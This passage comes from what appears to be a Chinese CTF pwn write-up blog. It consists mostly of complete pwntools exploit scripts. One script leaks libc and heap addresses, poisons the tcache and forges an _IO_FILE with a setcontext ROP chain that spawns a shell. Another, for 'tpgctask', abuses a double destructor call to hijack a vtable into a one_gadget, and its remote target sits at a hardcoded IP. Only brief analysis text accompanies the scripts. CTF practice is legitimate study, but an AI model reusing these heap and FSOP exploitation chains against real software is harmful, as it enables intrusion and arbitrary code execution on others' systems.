<span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    num = lib.rand() % <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">while</span>(num &gt;= <span class="number">0x7f</span> <span class="keyword">or</span> num &lt;= <span class="number">0x20</span>):</span><br><span class="line">        num = lib.rand() % <span class="number">0x100</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(num))</span><br><span class="line">    pswd += <span class="built_in">chr</span>(num)</span><br><span class="line">success(pswd)</span><br><span class="line"></span><br><span class="line">show(<span class="string">&quot;root&quot;</span>,pswd,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Content-type: text/html&quot;</span>)</span><br><span class="line">leak_addr = u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))+<span class="number">0x7f</span>*<span class="number">0x10000000000</span></span><br><span class="line">libc_base = leak_addr - <span class="number">0x1f72d0</span> </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">strlen_got = libc_base + <span class="number">0x1f6080</span></span><br><span class="line">remaloc_got = libc_base + <span class="number">0x1f6010</span></span><br><span class="line">binsh = libc_base + <span class="number">0x1b51d2</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">execve = libc_base + libc.sym[<span class="string">&quot;execve&quot;</span>]</span><br><span class="line">one_gadgets = [<span class="number">0x4e880</span>,<span class="number">0xe3199</span>,<span class="number">0xe31f3</span>]</span><br><span class="line">one_gadget = libc_base + one_gadgets[<span class="number">2</span>]</span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;remaloc_got &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(remaloc_got))</span><br><span class="line">success(<span class="string">&quot;_IO_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">setlocale_s(<span class="string">&quot;en_GB.UTF-8&quot;</span>)</span><br><span class="line">register(<span class="number">1000</span>,<span class="number">64</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,passwd=<span class="string">&quot;b&quot;</span>*<span class="number">0xd</span>)</span><br><span class="line">register(<span class="number">1000</span>,<span class="number">64</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,passwd=<span class="string">&quot;b&quot;</span>*<span class="number">0xd</span>)</span><br><span class="line">register(<span class="number">1000</span>,<span class="number">256</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,passwd=<span class="string">&quot;b&quot;</span>*<span class="number">0xd</span>)</span><br><span class="line">register(<span class="number">1000</span>,<span class="number">64</span>,<span class="string">&quot;c&quot;</span>*<span class="number">8</span>,passwd=<span class="string">&quot;d&quot;</span>*<span class="number">0xd</span>)</span><br><span class="line">register(<span class="number">1000</span>,<span class="number">64</span>,<span class="string">&quot;e&quot;</span>*<span class="number">8</span>,passwd=<span class="string">&quot;f&quot;</span>*<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line">logoff(<span class="string">&quot;e&quot;</span>*<span class="number">8</span>,passwd=<span class="string">&quot;f&quot;</span>*<span class="number">0xd</span>)</span><br><span class="line">register(<span class="number">1000</span>,<span class="number">16</span>,<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,passwd=<span class="string">&quot;b&quot;</span>*<span class="number">0xd</span>)</span><br><span class="line">register(<span class="number">1</span>,<span class="number">64</span>,<span class="string">&quot;yyy&quot;</span>,passwd=<span class="string">&quot;a:0&quot;</span>)</span><br><span class="line"></span><br><span class="line">logoff(<span class="string">&quot;yyy&quot;</span>)</span><br><span class="line">show(<span class="string">&quot;yyy&quot;</span>,<span class="string">&quot;a&quot;</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;Content-type: text/html\r\n&quot;</span>)</span><br><span class="line">ru(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr*<span class="number">0x1000</span>-<span class="number">0x2000</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">register(<span class="number">1</span>,<span class="number">64</span>,<span class="string">&quot;yyy&quot;</span>,passwd=<span class="string">&quot;a:0&quot;</span>)</span><br><span class="line">logoff(<span class="string">&quot;31&quot;</span>)</span><br><span class="line">logoff(<span class="string">&quot;yyy&quot;</span>)</span><br><span class="line"></span><br><span class="line">key = (heap_base+<span class="number">0x2200</span>)&gt;&gt;<span class="number">12</span></span><br><span class="line">payload = p64(_IO_list_all ^ key)</span><br><span class="line">note(<span class="string">&quot;yyy&quot;</span>,<span class="string">&quot;a&quot;</span>,payload,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">register(<span class="number">1</span>,<span class="number">1024</span>,<span class="string">&quot;e&quot;</span>*<span class="number">8</span>,passwd=<span class="string">&quot;a:0&quot;</span>)</span><br><span class="line">register(<span class="number">1</span>,<span class="number">64</span>,<span class="string">&quot;yyy&quot;</span>,passwd=<span class="string">&quot;a:0&quot;</span>)</span><br><span class="line"></span><br><span class="line">_IO_wfile_jumps = libc_base + libc.sym[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]</span><br><span class="line"></span><br><span class="line">next_chain = <span class="number">1</span></span><br><span class="line">fake_io_addr = heap_base + <span class="number">0x22b0</span></span><br><span class="line">payload_addr = heap_base + <span class="number">0x23c8</span>  </span><br><span class="line">flag_addr = heap_base + <span class="number">0x23c8</span> </span><br><span class="line">socket_addr = heap_base + <span class="number">0x2538</span></span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000040123</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x00000000000240e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002573e</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000026302</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x00000000000e3559</span></span><br><span class="line"></span><br><span class="line">fake_IO_FILE =  <span class="string">b&quot;./flag\x00&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(payload_addr-<span class="number">0xa0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(setcontext+<span class="number">61</span>)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(flag_addr)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xd0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)</span><br><span class="line">fake_IO_FILE =  fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(_IO_wfile_jumps+<span class="number">0x30</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br><span class="line"></span><br><span class="line">payload = p64(flag_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">59</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">socket_data = p64(<span class="number">0x8108a8c00a1a0002</span>)</span><br><span class="line"></span><br><span class="line">note(<span class="string">&quot;e&quot;</span>*<span class="number">8</span>,<span class="string">&quot;a&quot;</span>,fake_IO_FILE+payload+socket_data,<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(fake_io_addr)*<span class="number">8</span></span><br><span class="line">note(<span class="string">&quot;yyy&quot;</span>,<span class="string">&quot;a&quot;</span>,payload,<span class="number">64</span>)</span><br><span class="line">success(<span class="string">&quot;setcontext+61 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext+<span class="number">61</span>))</span><br><span class="line">success(<span class="string">&quot;execve &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(execve))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;GET /poweroff&quot;</span></span><br><span class="line">sl(payload)</span><br><span class="line">sl(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#cat flag 1&gt;&amp;0</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="tpgctask"><a href="#tpgctask" class="headerlink" title="tpgctask"></a>tpgctask</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9)</span> stable release version 2.31.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">964</span>af918201c59dc08c1d903fa0bea90e91e87c9, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，NX</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>本题目的代码非常复杂，但功能却比较简单，几番尝试就发现了问题：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Take_Ruby(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">Take_Rod(<span class="string">&quot;b&quot;</span>*<span class="number">0x500</span>)</span><br><span class="line">Fuse_Weapon(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">Drop_Weapon()</span><br><span class="line">Drop_Ruby()</span><br><span class="line">Take_Ruby(<span class="string">&quot;d&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">Fuse_Weapon(<span class="string">&quot;e&quot;</span>*<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Weapon info]:</span><br><span class="line">   ------------------------------</span><br><span class="line">   Ruby:    dddddddd</span><br><span class="line">   Rod:     <span class="number">0</span>\xd6A\x00\x00\x00\x11\x00\x7f\x00X-A\x00\x00\x00\xc6\xd5\x00\x00\x00\x00\x00\x00\x00ddddddd\x00bbbbbb!\x00\x00\x00\x00\xc5\xd5\x00\x00\x00\xc6\xd5\x00\x00\x00\xc5\xd5\x00\x00\x00\x00\x00\x00\x00\xd6A\x00\x00\x00\x0b\x00\x7f\x00\x98.A\x00\x00\x00\xc6\xd5\x00\x00\x00\x00\x00\x00\x00ddddddd\x00bbbbbb\xb8.A\x00\x00\x00\xc7\xd5\x00\x00\x00\x05\x00\x00\x00\x05\x00\x00\x00bbbbbbb\xc0\xc6\xd5\x00\x00\x00\x00\x00\x00\x00bbbbbbbbbbbbbb\xe0\xc6\xd5\x00\x00\x00\x00\x00\x00\x00ddddddd\x00bbbbbb@\xd0\xd5\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00bbbbbbbbbbbbbbb!\x00\x00\x00\x00#\xd4\x00\x00H#\xd4\x00\x00P\xc6\xd5\x00\x00\x00\x05\x00\x00\x00\xd6A\x00\x00\x00\x11\x00\x7f\x00X-A\x00\x00\x00\xc6\xd5\x00\x00\x00\x00\x00\x00\x00ddddddd\x00bbbbbb!\x00\x00\x00\x00\xc5\xd5\x00\x00\x00\xc6\xd5\x00\x00\x00\xc5\xd5\x00\x00\x00\x00\x00\x00\x00\xd6A\x00\x00\x00\x0b\x00\x7f\x00X-A\x00\x00\x00\xc6\xd5\x00\x00\x00\x00\x00\x00\x00ddddddd\x00bbbbbb\xf8-A\x00\x00\xc7\xd5\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb!\x00\x00\x00\x00#\xd4\x00\x00H#\xd4\x00\x00P\xc6\xd5\x00\x00\x00\x05\x00\x00\x00\x11\xbf3\x7f\x00\x00\x96\xbf3\x7f\x000\xc7\xd5\x00\x00\x00\xc7\xd5\x00\x00\x00bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><br><span class="line">   Fuse:    eeeeeeeeeeeeeeee</span><br><span class="line">   ------------------------------</span><br></pre></td></tr></table></figure>
<p>可以发现：<code>Ruby</code> 的释放和重申请似乎影响了 <code>Rod</code>，可以先用 GDB 定位泄露数据的地址，然后定位可利用数据的位置，泄露 libc_base，heap_base，pro_base：</p>
<p>之后在尝试的过程中发现 <code>Drop_Weapon</code> 会导致 <code>Drop_Rod</code> 和 <code>Drop_Ruby</code> 可以再次执行（原本会被程序检查并制止），第二次调用析构函数的过程会导致其虚表发生错误，配合堆风水就可以劫持程序流程</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x40a11b\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Take_Ruby</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;new owner here:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Drop_Ruby</span>():</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Take_Rod</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;new owner here:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Drop_Rod</span>():</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fuse_Weapon</span>(<span class="params">name</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;new weapon here&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Drop_Weapon</span>():</span></span><br><span class="line">    cmd(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">Take_Ruby(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">Take_Rod(<span class="string">&quot;b&quot;</span>*<span class="number">0x500</span>)</span><br><span class="line">Fuse_Weapon(<span class="string">&quot;c&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">Drop_Weapon()</span><br><span class="line">Drop_Ruby()</span><br><span class="line">Take_Ruby(<span class="string">&quot;d&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">Fuse_Weapon(<span class="string">&quot;e&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Rod:     &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">pro_base = leak_addr - <span class="number">0x1e630</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2c618</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">ru(p64(<span class="number">0x511</span>))</span><br><span class="line">ru(p64(<span class="number">0x511</span>))</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ec100</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0xe6aee</span>,<span class="number">0xe6af1</span>,<span class="number">0xe6af4</span>]</span><br><span class="line">one_gadget = libc_base + one_gadgets[<span class="number">0</span>]</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Drop_Ruby()</span><br><span class="line">Take_Ruby(p64(heap_base+<span class="number">0x2ccd8</span>))</span><br><span class="line">Drop_Rod()</span><br><span class="line">Take_Rod(p64(one_gadget))</span><br><span class="line">Fuse_Weapon(<span class="string">&quot;e&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">6</span>)</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="core"><a href="#core" class="headerlink" title="core"></a>core</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /proc/version </span><br><span class="line">Linux version <span class="number">5.8</span><span class="number">.0</span> (vm@vm-pc) (gcc (Ubuntu <span class="number">9.4</span><span class="number">.0</span><span class="number">-1u</span>buntu1~<span class="number">20.04</span><span class="number">.1</span>) <span class="number">9.4</span><span class="number">.0</span>, GNU ld (GNU Binutils <span class="keyword">for</span> Ubuntu) <span class="number">2.34</span>) #<span class="number">1</span> SMP Fri May <span class="number">12</span> <span class="number">11</span>:<span class="number">14</span>:<span class="number">51</span> CST <span class="number">2023</span></span><br></pre></td></tr></table></figure>
